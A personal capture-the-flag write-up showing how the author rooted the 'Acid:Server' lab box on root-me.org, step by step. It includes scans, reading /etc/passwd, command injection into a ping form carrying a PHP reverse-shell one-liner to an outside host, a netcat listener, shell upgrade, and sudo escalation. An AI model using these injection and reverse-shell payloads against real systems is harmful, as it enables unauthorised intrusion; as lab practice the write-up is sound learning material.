@@ -1,0 +1,290 @@
+Acid:Server
+time taken: 2 1/2 hours
+
+
+root@kali:~/ctf_shit/acid_server# nmap -sV -O -A -T5 ctf01.root-me.org -p 1-60000
+Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-23 23:27 MDT
+Warning: 212.129.28.18 giving up on port because retransmission cap hit (2).
+Nmap scan report for ctf01.root-me.org (212.129.28.18)
+Host is up (0.096s latency).
+Not shown: 59998 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 8e:c3:aa:2a:69:53:d0:96:9a:a0:c9:e5:4f:93:76:a2 (DSA)
+|   2048 20:e8:97:77:26:50:f4:79:86:a2:87:01:fb:29:39:49 (RSA)
+|_  256 2e:0a:4c:2c:4e:f5:5d:88:b8:88:09:89:47:b1:07:0c (ECDSA)
+33447/tcp open  http    Apache httpd 2.4.10 ((Ubuntu))
+|_http-server-header: Apache/2.4.10 (Ubuntu)
+|_http-title: /Challenge
+Aggressive OS guesses: QEMU user mode network gateway (95%), Konica Minolta 7035 printer (87%), Bay Networks BayStack 450 switch (software version 3.1.0.22) (87%), GNU Hurd 0.3 (87%), Bay Networks BayStack 450 switch (software version 4.2.0.16) (86%), HP 9100c Digital Sender printer (J3113A) (86%), Minolta Di550 laser printer (86%), NEC SuperScript printer (86%), Allied Telesyn AT-9006SX/SC switch (86%), Cabletron ELS100-24TXM Switch or Icom IC-7800 radio transceiver (86%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.18 ms 10.0.2.2
+2   0.33 ms ctf01.root-me.org (212.129.28.18)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 473.19 seconds
+
+
+picture of a skeleton in a hood, but the title is "/Challenge"..
+
+ctf01.root-me.org:33447/Challenge brings us to a login page
+
+no sql injection is seems...
+
+viewing source gives some interesting things
+
+
+        <script type="text/JavaScript" src="js/sha512.js"></script> 
+        <script type="text/JavaScript" src="js/forms.js"></script> 
+
+seem liek javascript login/cryptography libraries
+
+at the top:
+
+<!DOCTYPE gkg.qvpn html> 
+
+gkg.qvpn -> rot13 --> txt.dica --> acid.txt
+
+/protected_page.php
+
+tells us we must login. maybe use those javascript libraries?
+
+looking online, the peredur github repo has this readme:
+
+https://github.com/peredurabefrog/phpSecureLogin/blob/master/README.md
+
+which contains these test creds:
+
+Username : test_user Email : test@example.com Password : 6ZaxN2Vzm9NUJT2y
+
+logs in successfully. page then includes a link to a page called "Try to Extract Juicy Details"
+immediatey go for /etc/passwd... but cant see anything...
+
+turns out it is in view source:
+
+root:x:0:0:root:/root:/bin/bash
+.
+.
+.
+acid:x:1000:1000:acid,,,:/home/acid:/bin/bash
+mysql:x:111:126:MySQL Server,,,:/nonexistent:/bin/false
+saman:x:1001:1001:,,,:/home/saman:/bin/bash
+sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
+
+so users are:
+root
+acid
+saman
+
+also this hex string in a comment at the bottom of the page: 0x5933566a4c6e4a34626e413d
+
+
+0x5933566a4c6e4a34626e413d --> Y3VjLnJ4bnA=
+base64 decode: cuc.rxnp
+looks like rot13 again: php.ekac --> cake.php
+
+cake.php seems to log us out -.- but is titled "/Magic_Box
+
+...which is 403 forbidden.
+
+let's use dirb:
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Jul 24 00:13:05 2017
+URL_BASE: http://ctf01.root-me.org:33447/Challenge/Magic_Box/
+WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
+EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 4620                                                          
+
+---- Scanning URL: http://ctf01.root-me.org:33447/Challenge/Magic_Box/ ----
++ http://ctf01.root-me.org:33447/Challenge/Magic_Box/command.php (CODE:200|SIZE:594)
+
+
+lets us ping an ip address. I bet this can also do other things with some clever input...
+
+tried python, bash shells... didn't work. I think the machine does not let bash make connections like this here, and python command is too long (limited to 200 chars as seen in view source)
+
+;php -r '$sock=fsockopen("PUBLIC_IP",32928);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+works!!
+
+root@kdog:~/ctf_shit/acid_server# nc -nvlp 32928
+listening on [any] 32928 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.2] 57559
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ pwd
+/var/www/html/Challenge/Magic_Box
+$ ls
+command.php
+command.php.save
+command2.php.save
+command2.php.save.1
+low.php
+proc
+tails.php
+$ 
+
+those files seem to be tied to the file and ping web apps we just saw
+
+$ uname -ar
+Linux acid 3.19.0-15-generic #15-Ubuntu SMP Thu Apr 16 23:32:01 UTC 2015 i686 i686 i686 GNU/Linux
+$ gcc
+/bin/sh: 11: gcc: not found
+
+so no easy way to root it seems..
+
+let's at least get a better shell...
+
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+www-data@acid:/$ ls
+ls
+bin    dev   initrd.img  media	passwd	run    srv  usr
+boot   etc   lib	 mnt	proc	s.bin  sys  var
+cdrom  home  lost+found  opt	root	sbin   tmp  vmlinuz
+
+what is this s.bin?
+
+www-data@acid:/s.bin$ ls
+ls
+investigate.php
+
+www-data@acid:/s.bin$ cat investigate.php
+cat investigate.php
+<?php
+echo "Now you have to behave like an investigator to catch the culprit\n";
+?>
+
+??????
+
+www-data@acid:/s.bin$ ls -al
+ls -al
+total 12
+drwxr-xr-x  2 root root 4096 Aug  8  2015 .
+drwxr-xr-x 23 root root 4096 Jul 24 10:46 ..
+-rw-r--r--  1 root root   84 Aug  8  2015 investigate.php
+
+AHA. maybe "investigator" means root? or some shit
+
+www-data@acid:/home/acid$ ls -al
+ls -al
+total 112
+drwxr-xr-x 17 acid acid 4096 Aug  8  2015 .
+drwxr-xr-x  4 root root 4096 Aug  7  2015 ..
+-rw-------  1 acid acid   49 Aug  8  2015 .Xauthority
+-rw-------  1 acid acid 5486 Aug  8  2015 .bash_history
+-rw-r--r--  1 acid acid  220 Jul 31  2015 .bash_logout
+-rw-r--r--  1 acid acid 3763 Aug  8  2015 .bashrc
+drwxrwxr-x 11 acid acid 4096 Aug  8  2015 .cache
+drwx------ 15 acid acid 4096 Aug  3  2015 .config
+drwx------  3 acid acid 4096 Jul 31  2015 .dbus
+-rw-r--r--  1 acid acid   26 Jul 31  2015 .dmrc
+drwx------  3 acid acid 4096 Aug  8  2015 .gconf
+drwxrwxr-x  3 acid acid 4096 Jul 31  2015 .local
+drwx------  4 acid acid 4096 Aug  3  2015 .mozilla
+-rw-r--r--  1 acid acid  675 Jul 31  2015 .profile
+-rw-rw-r--  1 acid acid   66 Aug  6  2015 .selected_editor
+-rw-r--r--  1 acid acid    0 Jul 31  2015 .sudo_as_admin_successful <--WHAT IS THIS??
+drwx------  4 acid acid 4096 Aug  3  2015 .thumbnails
+-rw-r--r--  1 acid acid   14 Oct 23  2012 .xscreensaver
+-rw-------  1 acid acid  242 Aug  8  2015 .xsession-errors
+-rw-------  1 acid acid  242 Aug  8  2015 .xsession-errors.old
+drwxr-xr-x  3 acid acid 4096 Aug  7  2015 Desktop
+drwxr-xr-x  2 acid acid 4096 Jul 31  2015 Documents
+drwxr-xr-x  2 acid acid 4096 Aug  7  2015 Downloads
+drwxr-xr-x  2 acid acid 4096 Jul 31  2015 Music
+drwxr-xr-x  2 acid acid 4096 Jul 31  2015 Pictures
+drwxr-xr-x  2 acid acid 4096 Jul 31  2015 Public
+drwxr-xr-x  2 acid acid 4096 Jul 31  2015 Templates
+drwxr-xr-x  2 acid acid 4096 Jul 31  2015 Videos
+
+maybe this is a clue that we can sudo into root if we get a local user?
+
+after looking around for a long time, there is an unusual directory in /sbin:
+
+www-data@acid:/sbin$ ls -al
+ls -al
+total 9660
+drwxr-xr-x  3 root root     12288 Aug  8  2015 .
+drwxr-xr-x 23 root root      4096 Jul 24 10:46 ..
+-rwxr-xr-x  1 root root     52466 May 19  2013 MAKEDEV
+.
+.
+.
+-rwxr-xr-x  1 root root     27784 Jun 30  2014 rarp
+-rwxr-xr-x  1 root root      9744 Feb 23  2015 raw
+drwxr-xr-x  2 root root      4096 Aug  7  2015 raw_vs_isi  <-- INTERESTING
+lrwxrwxrwx  1 root root        14 Jul 31  2015 reboot -> /bin/systemctl
+-rwxr-xr-x  1 root root      5544 Nov 18  2014 regdbdump
+.
+.
+.
+
+www-data@acid:/sbin/raw_vs_isi$ ls
+ls
+hint.pcapng
+
+some sort of conversation?
+
+cant use tcp dump as it needs sudo..
+
+www-data@acid:/sbin/raw_vs_isi$ strings hint.pcapng | grep the
+strings hint.pcapng | grep the
+grWhat was the name of the Culprit ???
+saman and now a days he's known by the alias of 1337hax0r
+
+ooooo that is probably useful
+
+root@kali:~/ctf_shit/acid_server# ssh saman@ctf01.root-me.org
+
+saman@ctf01.root-me.org's password: 1337hax0r
+Welcome to Ubuntu 15.04 (GNU/Linux 3.19.0-15-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+172 packages can be updated.
+139 updates are security updates.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+saman@acid:~$ sudo -l
+[sudo] password for saman: 
+Matching Defaults entries for saman on acid:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User saman may run the following commands on acid:
+    (ALL : ALL) ALL
+
+we know what that means...
+
+saman@acid:~$ sudo su
+  ____                            _         _       _   _                 
+ / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
+| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
+| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
+ \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
+                  |___/                                                   
+root@acid:/home/saman# id
+uid=0(root) gid=0(root) groups=0(root)
+
+done!!
+
